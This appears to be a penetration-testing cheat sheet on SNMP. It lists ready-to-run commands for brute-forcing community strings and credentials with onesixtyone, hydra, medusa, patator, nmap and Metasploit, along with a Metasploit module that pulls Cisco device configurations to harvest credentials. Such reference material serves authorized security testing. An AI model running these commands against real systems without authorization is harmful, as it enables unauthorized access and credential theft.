---
author(s):
  - Userware
tags:
  - vulnerability-assessment
  - initial-access
  - password-cracking
  - network-ports
---
# SNMP

## 01 - Brute Force Community Strings

```
$ onesixtyone -c /usr/share/seclists/SecLists/Discovery/SNMP/snmp.txt 
```

These are the most common credentials.

```
$ cat > community.txt << EOF
public
private
manager
EOF

$ onesixtyone -c community.txt -i ip_targets.txt -o output.txt -w 100
```

## 02 - Retrieve Credentials

### 2.1 - Cisco

```
msf > use auxiliary/scanner/snmp/cisco_config_tftp

msf auxiliary(scanner/snmp/cisco_config_tftp) > options

Module options (auxiliary/scanner/snmp/cisco_config_tftp):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   COMMUNITY  public           yes       SNMP Community String
   LHOST                       no        The IP address of the system running this module
   OUTPUTDIR                   no        The directory where we should save the configuration files (disabled by default)
   RETRIES    1                yes       SNMP Retries
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      161              yes       The target port (UDP)
   SOURCE     4                yes       Grab the startup (3) or running (4) configuration (Accepted: 3, 4)
   THREADS    1                yes       The number of concurrent threads (max one per host)
   TIMEOUT    1                yes       SNMP Timeout
   VERSION    1                yes       SNMP Version <1/2c>


msf auxiliary(scanner/snmp/cisco_config_tftp) > run rhosts=<IP> version=<1 | 2c>
```

## 03 - Brute Force Credentials

### 3.1 - #onesixtyone

```
$ onesixtyone -c /usr/share/seclists/SecLists/Discovery/SNMP/snmp.txt -i ip_targets.txt -o output.txt -w 100
```

### 3.2 - #hydra

```
$ hydra -P passwords.lst <IP> snmp
```

### 3.3 - #medusa

```
$ medusa -M snmp -m TIMEOUT:2 -m ACCESS:READ -h <IP> -u <username> -P /usr/share/seclists/SecLists/Discovery/SNMP/snmp.txt

$ medusa -M snmp -m TIMEOUT:2 -m ACCESS:WRITE -h <IP> -u <username> -P /usr/share/seclists/SecLists/Discovery/SNMP/snmp.txt
```

### 3.4 - #patator

```
$ patator snmp_login host=<IP> version=3 user=<username> auth_key=FILE0 0=/usr/share/seclists/SecLists/Discovery/SNMP/snmp.txt -x ignore:mesg=unknownUserName

$ patator snmp_login host=<IP> version=3 user=<username> auth_key=FILE0 0=/usr/share/seclists/SecLists/Discovery/SNMP/snmp.txt -x ignore:mesg=wrongDigest
```

### 3.5 - #network-mapper

```
$ sudo nmap -sU -p 161,162 -n --script snmp-brute --script-args "snmp-brute.communitiesdb=/usr/share/seclists/SecLists/Discovery/SNMP/snmp.txt" <IP
```

### 3.6 - #metasploit

```
msf > use auxiliary/scanner/snmp/snmp_login

msf auxiliary(scanner/snmp/snmp_login) > options

Module options (auxiliary/scanner/snmp/snmp_login): 

   Name              Current Setting                                       Required  Description 
   ----              ---------------                                       --------  ----------- 
   BLANK_PASSWORDS   false                                                 no        Try blank passwords for all users 
   BRUTEFORCE_SPEED  5                                                     yes       How fast to bruteforce, from 0 to 5 
   DB_ALL_CREDS      false                                                 no        Try each user/password couple stored in the current database 
   DB_ALL_PASS       false                                                 no        Add all passwords in the current database to the list 
   DB_ALL_USERS      false                                                 no        Add all users in the current database to the list 
   DB_SKIP_EXISTING  none                                                  no        Skip existing credentials stored in the current database (Accepted: none, user, user&realm) 
   PASSWORD                                                                no        The password to test 
   PASS_FILE         /opt/metasploit/data/wordlists/snmp_default_pass.txt  no        File containing communities, one per line 
   RHOSTS                                                                  yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit 
   RPORT             161                                                   yes       The target port 
   STOP_ON_SUCCESS   false                                                 yes       Stop guessing when a credential works for a host 
   THREADS           1                                                     yes       The number of concurrent threads (max one per host) 
   USER_AS_PASS      false                                                 no        Try the username as the password for all users 
   VERBOSE           true                                                  yes       Whether to print output for all attempts 
   VERSION           1                                                     yes       The SNMP version to scan (Accepted: 1, 2c, all)

msf auxiliary(scanner/snmp/snmp_login) > set rhosts <IP>

msf auxiliary(scanner/snmp/snmp_login) > set pass_file /usr/share/seclists/SecLists/Discovery/SNMP/snmp.txt

msf auxiliary(scanner/snmp/snmp_login) > set stop_on_success true

msf auxiliary(scanner/snmp/snmp_login) > run -j
```

List the valid credentials.

```
msf auxiliary(scanner/snmp/snmp_login) > creds
```

---
## References

### Backlinks

- [[06 - Tactics & Techniques & Procedures Phases/C - Initial Access/0x00 - Exploitation/0xF - Remote Services Exploitation/Network Ports/Remote Services/Telnet|Initial Access: Telnet]]

### Hacking Articles

- [Hacking Articles: Password Cracking SNMP](https://www.hackingarticles.in/password-crackingsnmp/)

### Penetration Testing Tools

- [Penetration Testing Tools: Hydra Protocols](https://en.kali.tools/?p=220)

- [Penetration Testing Tools: Medusa](https://en.kali.tools/?p=200)

### Mike Bond

- [Mike Bond: Cisco SNMP Secrets](https://bond-o.medium.com/cisco-snmp-secrets-e4b731b19737)